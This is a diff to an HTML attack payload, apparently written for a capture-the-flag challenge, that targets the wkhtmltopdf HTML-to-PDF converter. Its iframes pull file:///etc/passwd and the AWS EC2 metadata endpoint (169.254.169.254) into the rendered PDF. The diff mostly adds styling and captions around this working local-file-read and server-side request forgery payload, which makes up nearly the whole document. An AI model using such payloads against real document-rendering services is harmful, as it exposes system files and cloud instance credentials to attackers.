@@ -2,18 +2,32 @@
 <html>
 <head>
     <title>CTF File Leak via wkhtmltopdf</title>
+    <style>
+        body { font-family: sans-serif; margin: 20px; }
+        h1 { color: #333; }
+        pre { background-color: #f0f0f0; padding: 10px; border: 1px solid #ccc; white-space: pre-wrap; word-wrap: break-word; }
+        iframe { border: 1px solid #ddd; background-color: #fff; }
+    </style>
 </head>
 <body>
     <h1>Attempting to Leak /etc/passwd:</h1>
+    <p>This section tries to embed the Linux password file.</p>
     <pre>
-        <iframe src="file:///etc/passwd" height="500" width="500"></iframe>
+        <iframe src="file:///etc/passwd" height="500" width="800"></iframe>
     </pre>
 
-    <h1>Attempting to Leak AWS EC2 Metadata (if applicable):</h1>
+    <hr>
+
+    <h1>Attempting to Leak AWS EC2 Metadata:</h1>
+    <p>This section targets AWS instance metadata, useful if the CTF server is on EC2.</p>
     <pre>
-        <iframe src="http://169.254.169.254/latest/meta-data/" height="500" width="500"></iframe>
+        <iframe src="http://169.254.169.254/latest/meta-data/" height="500" width="800"></iframe>
     </pre>
 
-    <p>If successful, the content of the targeted files should appear above in the generated PDF.</p>
+    <hr>
+
+    <p style="margin-top: 30px; font-size: 0.9em; color: #666;">
+        If successful, the content of the targeted files should appear above in the generated PDF.
+    </p>
 </body>
 </html>
